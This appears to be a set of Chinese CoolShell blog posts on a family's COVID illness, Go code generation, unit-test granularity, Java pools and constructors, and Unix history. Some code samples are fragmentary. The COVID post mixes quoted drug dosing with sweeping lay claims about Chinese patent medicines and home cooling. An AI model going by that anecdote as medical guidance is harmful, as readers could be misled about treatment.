#### 整个过程我先说一下整个过程（我会不断更新这个过程，直到转阴）。说明一下， **我孩子老婆都打过三针国产疫苗，孩子是科兴，老婆是北京生物，我完全没有打** 。先是我家孩子（12 岁）。上周三（12 月 7 日），孩子早上起来就说头疼，一测体温，38 度 5，就停止上网课，老实休息了，我们并没给孩子吃什么药，到了晚上，孩子的体温到了 39.4，嗓子疼，我老婆用酒精给孩子物理降温（注：事实上最好别用酒精，因为会被皮肤吸收导致副作用），成功降到了 38.2 左右。周四（12 月 8 日），孩子的体温在 38.2 一天，我老婆给孩子吃了莲花清瘟，被我制止了，本来想上退烧药的，但是我想体温也不算高，能不吃就不吃，于是就让孩子冲了个复方感冒冲剂（其实里面含对乙酰氨基酚，后面会说）。周五（12 月 9 日），孩子不停地出汗，到下午体温正常了，然后咳嗽，鼻涕就来了，感冒症状来了，但精神不好，体虚无力。周末休息两天就基本没事了，也转阴了。接下来就到我了。周五那天感觉嗓子有点异样，我没怎么在意，周六（12 月 10）就开始发烧了，傍晚 18 点左右，我是手脚冰冷，还有点打冷颤，头晕，嗓子干燥，我就钻被子里了，在半睡不睡的状态下到了 20 点左右，我浑身发烫，我老婆过来给我一量体温，39.8，说要不要也抹点酒精？我想，北京这个季节，物理降温不就上阳台上站一会就好了吗？当然，我就是把窗开了个口，把室温降到 20 度左右，然后，短袖短裤呆了一会就感到清醒了一些。这个时候，我觉得再来碗热汤就好了，我喝不习惯生姜红糖水，又腥又甜，我就自己整了一小锅西红柿蛋花汤，为了让我更能出汗，并适合我的重口味，我又加了点辣椒，一小锅热汤下肚，汗出的不亦乐乎，体温降低到38.4度，我觉的不用再吃药了，当然，嗓子也疼了。但是我舒服了很多，最后还看了下摩洛哥是怎么把C罗送回家的比赛。
周日（12 月 11）是我最难受的一天，全天体温在 38.2左右，从早上就没有精神，吃完早点后，从 10 点一直睡到下午 15 点（因为嗓子疼，所以睡的也不安宁，各种难受）， 这天我一会儿就出次汗，但是体温降不下来，始终在 38.2，然后我在犹豫是不是吃布洛芬，但是我感觉体温也不是很高，布洛芬这种药能不吃不不吃。然后，睡前喝了一袋感冒冲剂。周日这天，我婆也发烧，38.5，她全身疼痛，包括嗓子。这一天，我们在家啥也干不了，全家都在床上躲着，只有孩子还能动，所以，有些事只能让孩子去干了，我们也只点外卖了。周一（12 月 12 日）我早上起来，38.5，开完周会后，看很多人说泰诺有用，然后翻了一下家，居然没找到，算，还是冲两包感冒冲剂得了（后来才知道，中成药里也都是掺了对乙酰氨基酚，看来中医对自己都没什么信心），于是整个下午就在出汗了，我一整天都没有什么食欲，到了下午 17 点左右，体温正常了 36.7，但是晚上又到了 37 度，开始咳痰，轻微流鼻涕，不过感觉没什么事了。而我老婆的烧居然退了，她说她应该好了。这就是我吃的感冒冲剂。注：为什么 还要整点咖啡因，说明书上说，怕对乙酰氨基酚造成嗜睡，所以用咖啡因来消解，这复方逻辑，毫无破绽啊
周二（12 月 13 日）我早上起床后， 体温还是在 37.2 度，我的嗓子干燥微疼，头也不疼就是头晕，所以，今天睡了两次，一次是中午12 点半到下午 14点半，一次是 16：40 到 19:10，两次都出汗了，而且第二觉睡地太爽了，感觉是这两天睡过最高质量高的觉，而且嗓子不干了也好了，体温正常了 36.8，但是感冒症状出来了，接下来几天休息一下应该就好了。我孩子应该感冒也没有精神，所以一天来也是醒醒睡睡。而我老婆又开始发烧了，还带这样的，跳跃性发烧…… 更不好的是她嗓子已经疼到说不出话，也咽不下东西了，今天她也是床上躺了一天……周三（12月14日）我今天已经不发烧了，就是频率不高的咳嗽，轻微鼻塞，不过，还是要休息，喝水。我老婆体温还是低烧中，嗓子疼痛好了些，感觉正在恢复中……**整个过程，对我和我孩子来说，不难受，感觉就是发3天烧睡3天，再休息 3 天的样子，嗓子干燥微疼，比以前的病毒性感冒好多了，以前的病毒性感冒导致的嗓子疼我是连咽口水都咽不下去。但是对于我老婆就不一样了，她先是浑身疼痛，嗓子干燥，到现在嗓子疼如刀割，说不出话。这个事可能也因人而异。**继续更新，自我阳性以来半个月了，从 12 月 14 日退烧后，我就一直处在感冒和低频咳嗽中，直到12 月 27 日才发现不咳嗽也不感冒了，但是说话还是有一点鼻音，估计还要 5-7 天就可以完全恢复了。
#### 注意事项能物理降温就不要吃药来降（ **应该避免使用酒精擦拭，因为有副作用，用水或冰就可以了** ），降到 38.5 以下，就可以自己抗了。如果物理降温不奏效，就要吃布洛芬和泰诺(林)，这两种药非常有帮助，但是你应该在药店里买不到了，所以，你可以买中成药或复方药，反正里面的中药没有用，而几乎所有的中成药里都被加入了“对乙酰氨基酚”，算是“间接”或“复方”泰诺(林)了。但是，不要多服，不然，药量叠加，会导致你肝肾中毒。参看《这些所谓“中成药”，关键原料是对乙酰氨基酚，服用小心叠加过量》下面文字节选自“默沙东诊疗手册”> 最有效和最广泛使用的退热药为对乙酰氨基酚和非甾体抗炎药 (NSAID)，如阿司匹林、布洛芬和萘普生。 > > 通常，人们可能采取以下方式之一： > >   * 每6小时650毫克对乙酰氨基酚（1天内不超过4000毫克） > >   * 每6小时200到400毫克布洛芬 > >> > 因为许多非处方感冒药或流感制剂含有对乙酰氨基酚，人们一定要注意不要在同一时间服用对乙酰氨基酚和一种或多种这些制剂。 > > 只有当温度达到106°F > (41.1°C)左右或更高时，才需要采取其它降温措施（如用温水喷雾和降温毯降温）。避免使用酒精擦拭，因为酒精可被皮肤吸收，可能产生有害效果。 > > 有血液感染或生命体征异常（例如，血压低、脉搏和呼吸速度加快）的人需入院。
另外，一定要多喝水，热水最好。多喝水的原因是：1）布洛芬、对乙酰氨基酚（扑热息痛）等退烧药会让人加速出汗，会导致脱水。2）布洛芬等退烧药主要在肝脏代谢，60%~90%经肾脏随尿排出。多喝水，可加速药物排出体外，减少退烧药对肝肾的损伤。3）排汗和排尿都会帮身体带走一些热量。具体喝多少水因人而异，一般在2.5升到4升间，主要看你上厕所的频率。我因为前三天都在出汗，所以怎么喝水都不怎么上厕所，这两天我大概一天喝4升左右。总之，发烧吃退烧药更要多喝水。另外，如果全家都病倒了，那生活就有点不方便了，所以，你得做好一些准备：1）事先订好桶装水，18L 的那种，让人可以给家里送水，发烧期间用水很快的。2）生活上的事要做好全家病倒的准备，做饭只能整方便的做的或是速食的了，家里存点牛奶，面包，麦片，火腿肠，水果什么的，保证营养。再不行就点外卖，我家已经点了三天的外卖。还让孩子当个配送员跑腿到菜市场和超市开着视频买东西……3）还是要提前备药，我是准备用药的时候，发现家里只找到了布洛芬和感冒冲剂，因为我有高血脂，我还要吃瑞舒伐他汀钙片，结果发现我周边 5 公里的药店基本全都休业了，估计店员都阳了。4）有老人的，要照顾好。有呼吸困难的，一定要送急诊。
根据知乎上的这个通过搜索引擎的测算，第一波的结束大约会在明年春节前结束。最后祝大家好运。（全文完）# Go 编程模式：Go Generation作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn图片来源：GopherSource在本篇文章中，我们将要学习一下Go语言的代码生成的玩法。Go语言代码生成主要还是用来解决编程泛型的问题，泛型编程主要解决的问题是因为静态类型语言有类型，所以，相关的算法或是对数据处理的程序会因为类型不同而需要复制一份，这样导致数据类型和算法功能耦合的问题。泛型编程可以解决这样的问题，就是说，在写代码的时候，不用关心处理数据的类型，只需要关心相当处理逻辑。泛型编程是静态语言中非常非常重要的特征，如果没有泛型，我们很难做到多态，也很难完成抽象，会导致我们的代码冗余量很大。### 本文是全系列中第6 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程
« 上一篇文章下一篇文章 »目录* 现实中的类比   * Go语方的类型检查     * Type Assert     * Reflection   * 它山之石   * Go Generator     * 函数模板     * 函数生成脚本     * 生成代码   * 新版Filter   * 第三方工具#### 现实中的类比举个现实当中的例子，用螺丝刀来做具比方，螺丝刀本来就是一个拧螺丝的动作，但是因为螺丝的类型太多，有平口的，有十字口的，有六角的……螺丝还有大小尺寸，导致我们的螺丝刀为了要适配各种千奇百怪的螺丝类型（样式和尺寸），导致要做出各种各样的螺丝刀。|---|---而真正的抽象是螺丝刀不应该关心螺丝的类型，只要关注好自己的功能是否完备，并让自己可以适配于不同类型的螺丝，如下所示，这就是所谓的泛型编程要解决的实际问题。---#### Go语方的类型检查因为Go语言目前并不支持真正的泛型，所以，只能用 `interface{}` 这样的类似于 `void*` 这种过度泛型来玩这就导致了我们在实际过程中就需要进行类型检查。Go语言的类型检查有两种技术，一种是 Type Assert，一种是Reflection。
##### Type Assert这种技术，一般是对某个变量进行 `.(type)`的转型操作，其会返回两个值， `variable, error`，第一个返回值是被转换好的类型，第二个是如果不能转换类型，则会报错。比如下面的示例，我们有一个通用类型的容器，可以进行 `Put(val)`和 `Get()`，注意，其使用了 `interface{}`作泛型在使用中，我们可以这样使用但是，在把数据取出来时，因为类型是 `interface{}` ，所以，你还要做一个转型，如果转型成功能才能进行后续操作（因为 `interface{}`太泛了，泛到什么类型都可以放）下在是一个Type Assert的示例：fmt.Printf("assertExample: %d (%T)\n", elem, elem)##### Reflection对于反射，我们需要把上面的代码修改如下：type Container struct {     s reflect.Value     }     func NewContainer(t reflect.Type, size int) *Container {     if size <=0  { size=64 }     return &Container{     s: reflect.MakeSlice(reflect.SliceOf(t), 0, size),     }     }     func (c *Container) Put(val interface{})  error {     if reflect.ValueOf(val).Type() != c.s.Type().Elem() {     return fmt.Errorf(“Put: cannot put a %T into a slice of %s",     val, c.s.Type().Elem()))     }     c.s = reflect.Append(c.s, reflect.ValueOf(val))     return nil     }     func (c *Container) Get(refval interface{}) error {     if reflect.ValueOf(refval).Kind() != reflect.Ptr ||     reflect.ValueOf(refval).Elem().Type() != c.s.Type().Elem() {     return fmt.Errorf("Get: needs *%s but got %T", c.s.Type().Elem(), refval)     }     reflect.ValueOf(refval).Elem().Set( c.s.Index(0) )     c.s = c.s.Slice(1, c.s.Len())     return nil     }
上面的代码并不难读，这是完全使用 reflection的玩法，其中* 在 `NewContainer()`会根据参数的类型初始化一个Slice   * 在 `Put()`时候，会检查 `val` 是否和Slice的类型一致。   * 在 `Get()`时，我们需要用一个入参的方式，因为我们没有办法返回 `reflect.Value` 或是 `interface{}`，不然还要做Type Assert   * 但是有类型检查，所以，必然会有检查不对的道理 ，因此，需要返回 `error`于是在使用上面这段代码的时候，会是下面这个样子：f1 := 3.1415926     f2 := 1.41421356237c := NewMyContainer(reflect.TypeOf(f1), 16)g := 0.0我们可以看到，Type Assert是不用了，但是用反射写出来的代码还是有点复杂的。那么有没有什么好的方法？#### 它山之石对于泛型编程最牛的语言 C++ 来说，这类的问题都是使用 Template来解决的。//用<class T>来描述泛型     template <class T>     T GetMax (T a, T b)  {     T result;     result = (a>b)? a : b;     return (result);     }
|int i=5, j=6, k;     //生成int类型的函数     k=GetMax<int>(i,j);long l=10, m=5, n;     //生成long类型的函数     n=GetMax<long>(l,m);---|---C++的编译器会在编译时分析代码，根据不同的变量类型来自动化的生成相关类型的函数或类。C++叫模板的具体化。这个技术是编译时的问题，所以，不需要我们在运行时进行任何的运行的类型识别，我们的程序也会变得比较的干净。那么，我们是否可以在Go中使用C++的这种技术呢？答案是肯定的，只是Go的编译器不帮你干，你需要自己动手。#### Go Generator要玩 Go的代码生成，你需要三件事：1. 一个函数模板，其中设置好相应的占位符。   2. 一个脚本，用于按规则来替换文本并生成新的代码。   3. 一行注释代码。##### 函数模板我们把我们之前的示例改成模板。取名为 `container.tmp.go` 放在 `./template/`下我们可以看到函数模板中我们有如下的占位符：* `PACKAGE_NAME` – 包名   * `GENERIC_NAME` – 名字   * `GENERIC_TYPE` – 实际的类型
其它的代码都是一样的。##### 函数生成脚本然后，我们有一个叫`gen.sh`的生成脚本，如下所示：#!/bin/bashset -e其需要4个参数：* 模板源文件   * 包名   * 实际需要具体化的类型   * 用于构造目标文件名的后缀然后其会用 `sed` 命令去替换我们的上面的函数模板，并生成到目标文件中。（关于sed命令请参看本站的《sed 简明教程》）##### 生成代码接下来，我们只需要在代码中打一个特殊的注释：其中，* 第一个注释是生成包名为 `gen` 类型为 `uint32` 目标文件名以 `container` 为后缀   * 第二个注释是生成包名为 `gen` 类型为 `string` 目标文件名以 `container` 为后缀然后，在工程目录中直接执行 ` go generate` 命令，就会生成如下两份代码，一份文件名为`uint32_container.go`package gen另一份的文件名为 `string_container.go`package gen这两份代码可以让我们的代码完全编译通过，所付出的代价就是需要多执行一步 `go generate` 命令。
#### 新版Filter现在我们再回头看看我们之前《Go编程模式：Map- Reduce》中的那些个用反射整出来的例子，有了这样的技术，我就不必在代码里用那些晦涩难懂的反射来做运行时的类型检查了。我们可以写下很干净的代码，让编译器在编译时检查类型对不对。下面是一个Fitler的模板文件 `filter.tmp.go`：package PACKAGE_NAMEtype GENERIC_NAMEList []GENERIC_TYPEtype GENERIC_NAMEToBool func(*GENERIC_TYPE) bool于是我们可在需要使用这个的地方，加上相关的 go generate 的注释#### 第三方工具我们并不需要自己手写 `gen.sh` 这样的工具类，已经有很多第三方的已经写好的可以使用。下面是一个列表：* Genny –    * Generic –    * GenGen –    * Gen –（全文完）# “单元测试要做多细？”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章主要来源是StackOverflow上的一个回答——“How deep are your unit tests?”。一个有13.8K的分的人（John Nolan）问了个关于TDD的问题，这个问题并不新鲜，最亮的是这个问题的Best Answer，这个问题是——
“TDD需要花时间写测试，而我们一般多少会写一些代码，而第一个测试是测试我的构造函数有没有把这个类的变量都设置对了，这会不会太过分了？那么，我们写单元测试的这个单元的粒度到底是什么样的？并且，是不是我们的测试测试得多了点？”#### 答案StackOverflow上，这个问题的答案是这样的——“I get paid for code that works, not for tests, so my philosophy is to test as little as possible to reach a given level of confidence (I suspect this level of confidence is high compared to industry standards, but that could just be hubris). If I don’t typically make a kind of mistake (like setting the wrong variables in a constructor), I don’t test for it. I do tend to make sense of test errors, so I’m extra careful when I have logic with complicated conditionals. When coding on a team, I modify my strategy to carefully test code that we, collectively, tend to get wrong.”
**老板为我的代码付报酬，而不是测试，所以，我对此的价值观是——测试越少越好，少到你对你的代码质量达到了某种自信** （我觉得这种的自信标准应该要高于业内的标准，当然，这种自信也可能是种自大）。如果我的编码生涯中不会犯这种典型的错误（如：在构造函数中设了个错误的值），那我就不会测试它。 **我倾向于去对那些有意义的错误做测试，所以，我对一些比较复杂的条件逻辑会异常地小心** 。当在一个团队中，我会非常小心的测试那些会让团队容易出错的代码。这个回答对TDD似乎有一种否定， **最亮的是这个问题是由Kent Beck，Kent是XP和TDD的创造者，是敏捷开发实践方法的奠基人**。以致于还有人调侃到——The world does not think that Kent Beck would say this! There are legions of developers dutifully pursuing 100% coverage because they think it is what Kent Beck would do! I have told many that you said, in your XP book, that you don’t always adhere to Test First religiously. But I’m surprised too.
只是要地球人都不会觉得Kent Beck会这么说啊！我们有大堆程序员在忠实的追求着100%的代码测试覆盖率，因为这些程序员觉得Kent Beck也会这么干！我告诉过很多人，你在你的XP的书里说过，你并不总是支持“宗教信仰式的Test First”，但是今天Kent这么说，我还是很惊讶！后面还有一些人不同意Kent， 我一下子从这个事中想到了《fight club》里的那个精神分裂者创建了一个连自己都反对的地下组织。呵呵。其实我是非常同意Kent的，怎么合适怎么搞，爱怎么测试就怎么测试，只要自己和团队有信心就可以了。没有必要就一定要写测试，一定要测试先行。#### 其它答案八卦完了，我们还是来认认真真地看看这个问题中其它的其它答案，因为这个问题的也是国人爱问题的问题。**第二个答案：值得借鉴*** 开发过程中，单元测试应该来测试那些可能会出错的地方，或是那些边界情况。   * 维护过程中，单元测试应该跟着我们的bug report来走，每一个bug都应该有个UT。于是程序员就会对自己的代码变更有两个自信，一是bug 被 fixed，二是相同的bug不会再次出现。**第三个答案：给敏捷咨师看的答案**
这个答案在说，我们只注意到了TDD中的T，而忽略了第一个D，就是Driven…… bla bla bla… 又这扯这些空洞的东西了，国内的各种不学无术的敏捷咨询师最好这一口了。**第四个答案：致那些什么都要测试的人**如果我们需要测试一个像 `int square(int x)` 这样的开根函数，我们需要40亿个测试（每个数都要测试）。事实上这种情况可能还更糟糕，如果有这样一个方法 `void setX(int newX)` 不会更改其它的成员变量，如：obj.z, Obj.y，那么，你是不是还要去测试一下别的变量没有被改变？我们只可能测试那些有意义的，确实要测试的案例。#### 我的观点我在《TDD并没有看上去的那么美》一文中说过我的观点了，我就不再多说了。我还是把下面这些观点列出来，供大家思考和讨论：1） **我国的教育对我们最大的洗脑不是掩盖事实，而让我们习惯于标准答案，习惯于教条，从而不会思考！敏捷开发中的若干东西似乎都成了软件开发中对某种标准答案的教条，实在是悲哀！**2） **软件开发是一种脑力劳动，是一种知识密集型的工作，就像艺术作品一样，创作过程和成品是没有标准答案的。**
3） **软件的质量不是测试出来的，而是设计和维护出来的。就像工匠们在一点一点地雕琢他们的作品一样。**UT的粒度是多少，这个不重要，重要的是你会不会自己思考你的软件应该怎么做，怎么测试。（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 四个流行的Java连接池作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**C3P0** 是一个开放源代码的JDBC连接池，它在lib目录中与Hibernate一起发布,包括了实现jdbc3和jdbc2扩展规范说明的Connection 和Statement 池的DataSources 对象。（主页：）**BoneCP** 是一个开源的快速的 JDBC 连接池。BoneCP很小，只有四十几K（运行时需要log4j和Google Collections的支持，这二者加起来就不小了），而相比之下 C3P0 要六百多K。另外个人觉得 BoneCP 有个缺点是，JDBC驱动的加载是在连接池之外的，这样在一些应用服务器的配置上就不够灵活。当然，体积小并不是 BoneCP 优秀的原因，BoneCP 到底有什么突出的地方呢，请看看性能测试报告。（主页：）
**DBCP** （ **D** ata **b** ase **C** onnection **P** ool）是一个依赖Jakarta commons- pool对象池机制的数据库连接池，Tomcat的数据源使用的就是DBCP。目前 DBCP 有两个版本分别是 1.3 和 1.4。1.3 版本对应的是 JDK 1.4-1.5 和 JDBC 3，而1.4 版本对应 JDK 1.6 和 JDBC 4。因此在选择版本的时候要看看你用的是什么 JDK 版本了，功能上倒是没有什么区别。（主页：）**Proxool** 是一个Java SQL Driver驱动程序，提供了对你选择的其它类型的驱动程序的连接池封装。可以非常简单的移植到现存的代码中。完全可配置。快速，成熟，健壮。可以透明地为你现存的JDBC驱动程序增加连接池功能。（主页：）# Windows 7 的新粉丝 Linus Torvalds作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn正当Windows 7 开始热卖的时候，正当广大北美用户抱怨Windows 7的销售价格，在东方要比西方便宜很多的时候。我们著名的Linus Torvalds来到了日本东京的一个软件商店里“庆祝Windows 7的Release”，难道他是去那里买一份便宜的Windows 7？
!Linus Torvalds 在一个日本的软件商店_Linus Torvalds, 图片来自一个未经确认的 Yodobashi 商店， Tokyo, Japan. 来源: Jim Zemlin/The Linux Foundation ( **点击看大图** )_这个图片目前还没有新闻报道，不过已有很多来源可以参考了……Linus在日本参加一个 **Japan Linux Symposium**的座谈会，在一个Picaca的链接上说，Microsoft选择了和Japan Linux Symposium同一天，在座谈会的间隙，Linus和其同事想做点有趣的事情，于是他们来到了Windows 7的小商店里，当然，售货员同志并不知道这人是谁，而Linus一进店里马上就做了一个下蹲坚大拇指的手势，而他的同事很识相地马上就照了一张照片。呵呵，当然，他们什么也没有买。而在一个据说是照片作者的 BLOG 上，博主也证实了相关的说法，说，这是Linus的一种幽默的态度，还说，Linus应该做一个V字型的手势而不是大拇指，这主要是Linus对东方文不了解。呵呵。呵呵，很有意思吧。# 算法和数据结构词典作者：陈皓，左耳朵耗子
来自：酷壳网 CoolShell https://coolshell.cn我们知道，在编程的世界里，主要就是两个事，用一定的算法去处理一定的数据。算法可以理解为业务逻辑流程，而数据自然一定是按某种结构来存放，这就是数据结构。我们知道，数据结构的修改一定会导致算法的修改，我们也知道，数据结构直接关系到了整个程序的繁简性，高效性。而算法则是关系到数据处理的时间、空间性能，以及日后的扩展和维护。这两个东西是计算机科班出生的人或是需要学习编程的人必需要注意的两件头等大事。下面这个网站，由 Software and Systems Division, Information Technology Laboratory 创建。************这是一个关于算法，算法技术，数据结构，系统架构等相关问题的一个词典。其中，算法包括了一些常见的算法，比如： Ackermann’s function ，一些算法问题包括了 traveling salesman（销售员出差问题） and Byzantine generals（拜占庭将军问题），还有一些关于这些问题，算法的 实现链表 以及更多的信息。而索引页包括 领域索引 和 类型索引.
希望这个网站对有你用。当然，这个网站是英文的。# Java构造时成员初始化的陷阱作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn让我们先来看两个类：Base和Derived类。注意其中的whenAmISet成员变量，和方法preProcess()如果我们构造一个子类实例，那么，whenAmISet 的值会是什么呢？再续继往下阅读之前，请先给自己一些时间想一下上面的这段程序的输出是什么？是的，这看起来的确相当简单，甚至不需要编译和运行上面的代码，我们也应该知道其答案，那么，你觉得你知道答案吗？你确定你的答案正确吗？很多人都会觉得那段程序的输出应该是“set in preProcess()”，这是因为当子类Derived 的构造函数被调用时，其会隐晦地调用其基类Base的构造函数（通过super()函数），于是基类Base的构造函数会调用preProcess() 函数，因为这个类的实例是Derived的，而且在子类Derived中对这个函数使用了override关键字，所以，实际上调用到的是：Derived.preProcess()，而这个方法设置了whenAmISet 成员变量的值为：“set in preProcess()”。
当然，上面的结论是错误的。如果你编译并运行这个程序，你会发现，程序实际输出的是“set when declared ”。怎么为这样呢？难道是基类Base 的preProcess() 方法被调用啦？也不是！你可以在基类的preProcess中输出点什么看看，你会发现程序运行时，Base.preProcess()并没有被调用到（不然这对于Java所有的应用程序将会是一个极具灾难性的Bug）。虽然上面的结论是错误的，但推导过程是合理的，只是不完整，下面是整个运行的流程：1. 进入Derived 构造函数。   2. Derived 成员变量的内存被分配。   3. Base 构造函数被隐含调用。   4. Base 构造函数调用preProcess()。   5. Derived 的preProcess 设置whenAmISet 值为 “set in preProcess()”。   6. Derived 的成员变量初始化被调用。   7. 执行Derived 构造函数体。等一等，这怎么可能？在第6步，Derived 成员的初始化居然在 preProcess() 调用之后？是的，正是这样，我们不能让成员变量的声明和初始化变成一个原子操作，虽然在Java中我们可以把其写在一起，让其看上去像是声明和初始化一体。但这只是假象， **我们的错误就在于我们把Java中的声明和初始化看成了一体** 。 **在C++的世界中，C++并不支持成员变量在声明的时候进行初始化，其需要你在构造函数中显式的初始化其成员变量的值，看起来很土，但其实C++用心良苦。**
在面向对象的世界中，因为程序以对象的形式出现，导致了我们对程序执行的顺序雾里看花。所以， **在面向对象的世界中，程序执行的顺序相当的重要** 。下面是对上面各个步骤的逐条解释。1. 进入构造函数。   2. 为成员变量分配内存。   3. 除非你显式地调用super()，否则Java 会在子类的构造函数最前面偷偷地插入super() 。   4. 调用父类构造函数。   5. 调用preProcess，因为被子类override，所以调用的是子类的。   6. 于是，初始化发生在了preProcess()之后。这是因为，Java需要保证父类的初始化早于子类的成员初始化，否则，在子类中使用父类的成员变量就会出现问题。   7. 正式执行子类的构造函数（当然这是一个空函数，虽然我们没有声明）。你可以查看《Java语言的规格说明书》中的 相关章节 来了解更多的Java创建对象时的细节。C++的程序员应该都知道，在C++的世界中在“构造函数中调用虚函数”是不行的，Effective C++ 条款9：Never call virtual functions during construction or destruction，Scott Meyers已经解释得很详细了。
在语言设计的时候，“ **在构造函数中调用虚函数** ”是个两难的问题。1. 如果调用的是父类的函数的话，这个有点违反虚函数的定义。   2. 如果调用的是子类的函数的话，这可能产生问题的：因为在构造子类对象的时候，首先调用父类的构造函数，而这时候如果去调用子类的函数，由于子类还没有构造完成，子类的成员尚未初始化，这么做显然是不安全的。C++选择了第一种，而Java选择了第二种。* C++类的设计相对比较简陋，通过虚函数表来实现，缺少类的元信息。   * 而Java类的则显得比较完整，有super指针来导航到父类。最后，需要向大家推荐一本书，Joshua Bloch 和 Neal Gafter 写的 Java Puzzlers: Traps, Pitfalls, and Corner Cases，中文版《JAVA解惑》。（全文完）# （免费在线）新书推荐：搜索的用户界面作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn题外话：剑桥大学出版社很有意思，允许作者把书的全部内容放在网上，例如：Christopher D. Manning, Prabhakar Raghavan and Hinrich Schütze, _Introduction to Information Retrieval_ , Cambridge University Press. 2008.
《搜索的用户界面》的作者Marti Hearst是加州大学伯克利分校研究信息可视化的一位大儒，她有很多带有认知心理学加设计的尝试，在信息检索这门学科里的信息可视化领域很有地位。我斗胆把她的新书的梗概在这里描述一下，习惯看英文的朋友们可以点击链接去看英文原文，不喜欢看英文的朋友们可以有选择的看看我这里的总结，然后硬硬头皮，跳进去啃一些具体章节吧。本书可能收益的人有：对搜索有兴趣的学生，工业界做设计和评估的专业人士，对技术中的人本主义感兴趣的人，书痴。> 译文：本书综述 > > > 本书概括了信息寻找过程中人的方面，并专注于其中被用户界面可以支持的方面。本书描述一些用户界面的一般方法论，尤其是搜索的用户界面以及如何评估好的搜索界面。本书讨论了以下几个领域的研究成果和工业实践： > 查询的界定，搜索结果的显示，搜索结果分组，信息内的浏览导航，用户重新界定查询，个人化的搜索，以及更广义上的信息使用和文本分析。大多数的讨论还是和网页搜索引擎相关，但是本书也照顾到了其他类型的搜索。如下章节： > >   1. 搜索界面的设计 >   2. 评估搜索界面 >   3. 信息搜寻的模型 >   4. 界定查询 >   5. 搜索结果的呈现 >   6. 用户重新界定搜索 >   7. 支持搜索过程的一些手段：搜索历史，在搜索结果中再搜索，帮助用户理解如何更好搜索 >   8. 整合浏览导航和搜索 >   9. 搜索过程中的个人化 >   10. 搜索界面的可视化（如何呈现搜索结果） >   11. 文本分析中的可视化 >   12. 搜索界面中的一些新趋势 >
> > 本书是以前98年一个经典书的扩充和更新：Modern Information Retrieval, Baeza-Yates and Ribeiro- > Neto (Eds.), Addison Wesley本书是以前98年一个经典书的扩充和更新： _Modern Information Retrieval_ , Baeza-Yates and Ribeiro- Neto (Eds.), Addison Wesley# Unix 40年：昨天，今天和明天作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**经历了四个十年，操作系统的未来充满了变数，但传奇将会是永久的****原文** ：链接—Computerworld#### 译者前言今年是Unix40岁的生日。很早就看到这篇文章了，一直想转到中文社区。但一直没有时间，今天看到了CSDN首页的一篇《昨天,今天,明天! Unix系统的40年》号称是转载于cnBeta。这篇文章翻译的要有多烂有多烂，简直就是对Unix 40的历史和原文作者的一种不敬。所以，在这里给出全部译文。**关于更为详细的历史，可以参考我的《Unix** **传奇》上篇** **，下篇**
**以及一篇CSDN** **对我的采访《Unix的现状与未来** **》**#### 正文40年前的一个夏天，一个程序员只用了一个月的时间就创造出了这个世界上迄今为止最重要一个软件的原型。在1969年8月，Ken Thompson，AT&T公司Bell实验室的一个程序员，因为妻儿不在身边，所以有机会把他的一些关于新的操作系统的想法付诸实现。他用汇编语言在DEC（Digital Equipment Corp.）的PDP-7微机上写了第一个版本Unix，他只用了一周的时间就完成了一个简单的操作系统，包括一个shell，一个编译器还有一个汇编编译器。Thompson和他的一个同事Dennis Ritchie当时在开发一个叫“Multics（Multiplexed Information and Computing Service复杂指令和计算服务）”的分时(Time- Sharing)操作系统)，因为这个项目当时遇上了很多麻烦，所以Thompson和Dennis当时感到很没劲，他们即不想去做当时主流的“批处理（Batch）操作系统”，也不想去做那个看上去怪异和笨拙的Multics。所以，在他们来来回回讨论经了一些关于新系统的想法后，Thompson写下了第一个版本的Unix，然后，这两位老搭档在以后的几年里继续开发着这个操作系统，当然，后面有更多的同事（Doug McIlroy, Joe Ossanna 和 Rudd Canaday）加入了进来。一些当时Multics的理念也被带入到这个新的操作系统中来，不过，更为漂亮的Unix则带来了–“更少则为更多（less-is- more）”的哲学。
（ **陈皓注：** 在我们所认识的历史中，这两位程序员当时是在Multics下开发一个叫”太空旅行”的游戏，后来Multics项目解体了，这两位哥们觉得自己的游戏白弄了，所以就为了这个游戏开发了一个新的操作系统Unix，Unix的取名和Multics是相反的，Multics有”复杂的”的意思，而Unix则是”小巧的”意思。后来他们觉得这个操作系统非常不错，所以在后来发表了一篇论文向全世界宣布了这一操作系统，从此开启了计算机世界崭新的文化，详情可参看我的《 **Unix** **传奇** 》上篇，下篇）“一个强大的用于交互式的操作系统不应该在价格成本和人力成本上都是昂贵的” Ritchie 和 Thompson在开发这个操作系统5年后，他们在”计算机协会（ACM- Association for Computing Machinery）杂志”上发表了一篇文章《 _Communications of the ACM_ (CACM)》，文中说，”我们希望Unix的用户会找到那些非常重要的系统特性就是它是’简单的’，’一流的’和’易用的'”。显然，他们做到了，Unix的确成为了IT领域中的一块基石，被广泛地部署到了大学，政府和企业的服务器和工作站上。并且，Unix的影响力开发迅速地传播开来，这恐怕超出了所有人的估计，正如ACM在1983年给Thompson 和 Ritchie颁发最具价值的图灵奖（计算机领域的诺贝尔奖）所记录的那样–“Unix系统的模式已经在以一种全新的编程思想领导着新一代的软件开发”。
